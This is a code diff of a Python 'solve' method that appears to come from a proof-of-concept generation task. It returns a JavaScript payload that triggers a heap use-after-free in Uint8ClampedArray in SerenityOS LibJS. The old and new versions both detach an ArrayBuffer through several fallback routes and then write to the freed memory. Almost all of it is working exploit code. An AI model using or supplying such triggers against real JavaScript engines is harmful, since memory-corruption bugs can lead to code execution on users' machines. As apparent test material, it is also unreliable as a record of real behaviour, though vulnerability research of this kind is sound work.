@@ -3,35 +3,41 @@ import os
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in Uint8ClampedArray.
-        The vulnerability stems from Uint8ClampedArray not inheriting from TypedArray, causing it
-        to be missed during ArrayBuffer detachment/neutralization.
+        Generate a PoC for Heap Use After Free in Uint8ClampedArray (LibJS).
+        The vulnerability exists because Uint8ClampedArray was implemented separately
+        and failed to check if the underlying ArrayBuffer was detached before access.
         """
-        # JavaScript payload to trigger the UAF
         poc = b"""
-// Create an ArrayBuffer and a Uint8ClampedArray view on it
-var buffer = new ArrayBuffer(128);
-var view = new Uint8ClampedArray(buffer);
-
-// Detach the underlying ArrayBuffer
-// This frees the memory backing the buffer.
-// In the vulnerable version, 'view' is not updated/cleared because Uint8ClampedArray
-// was not tracked as a TypedArray view of the buffer.
-try {
-    detachArrayBuffer(buffer);
-} catch (e) {
-    // Fallback mechanisms to trigger detachment if the internal test function is missing
+function detach(buffer) {
     try {
-        structuredClone(buffer, { transfer: [buffer] });
-    } catch (e2) {
-        try {
-            window.postMessage(buffer, '*', [buffer]);
-        } catch (e3) {}
-    }
+        // Standard test-harness function in SerenityOS LibJS
+        detachArrayBuffer(buffer);
+        return;
+    } catch (e) {}
+
+    try {
+        // Alternative location in 'internals' object
+        internals.detachArrayBuffer(buffer);
+        return;
+    } catch (e) {}
+
+    try {
+        // Standard Web API way to detach a buffer
+        structuredClone(undefined, { transfer: [buffer] });
+        return;
+    } catch (e) {}
 }
 
-// Access the view after the buffer has been freed.
-// This triggers a Heap Use-After-Free (ASAN will catch this).
-view[0] = 0x41;
+// 1. Create the vulnerable object
+var u8 = new Uint8ClampedArray(128);
+var buf = u8.buffer;
+
+// 2. Detach the backing store (free the memory)
+detach(buf);
+
+// 3. Access the array to trigger Use-After-Free
+// In the vulnerable version, this access does not check is_detached()
+// and reads/writes to the freed memory region.
+u8[0] = 0x41;
 """
         return poc
